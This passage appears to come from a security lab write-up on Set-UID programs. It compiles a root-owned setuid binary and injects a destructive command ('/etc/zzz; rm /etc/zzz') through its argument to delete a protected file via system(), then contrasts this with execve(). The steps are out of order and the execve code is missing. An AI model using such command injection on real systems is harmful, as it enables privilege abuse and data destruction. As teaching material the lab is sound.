### Step 3: Compile and Set Ownership
Compile the binary and grant Set-UID privileges:
```bash
gcc catall.c -o catall
sudo chown root catall
sudo chmod 4755 catall
```
### Step 4: Inject Malicious Command
Inject a command chain via the input argument to delete the protected /etc/zzz file:

```Bash
./catall "/etc/zzz; rm /etc/zzz"
```
### Step 5: Verify File Removal & Reset PATH Environment Variable
Important Note on Terminal Verification:

If the PATH environment variable remains manipulated from Task 6 (PATH=/home/seed:$PATH), executing the standard ls command will trigger the custom malicious ls binary instead of the system's native utility. To restore original system behavior and properly verify the deletion message (No such file or directory), either restore the default PATH variable or execute the binary using its absolute system path /bin/ls.

Restoring PATH to system default:
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
ls -l /etc/zzz
```
* Alternatively, verify using absolute path:
```text
/bin/ls -l /etc/zzz
```
Expected Terminal Output: ls: cannot access '/etc/zzz': No such file or directory (Exploit Successful).

### Step 2: Modify catall.c to use execve()
Edit catall.c to comment out system() and enable execve():

* Output: /etc/zzz remains intact on the system. The shell metacharacters were treated literally as part of the filename parameter rather than interpreted as executable commands.

| Execution Method | Command Injection Result | Integrity of `/etc/zzz` | Security Assessment |
| :--- | :--- | :--- | :--- |
| **`system()`** | Success (Executes appended `rm`) | **Destroyed / Deleted** | ❌ Highly Vulnerable |
| **`execve()`** | Failed (Treated input as literal argument) | **Preserved / Intact** | ✅ Secure against Injection |









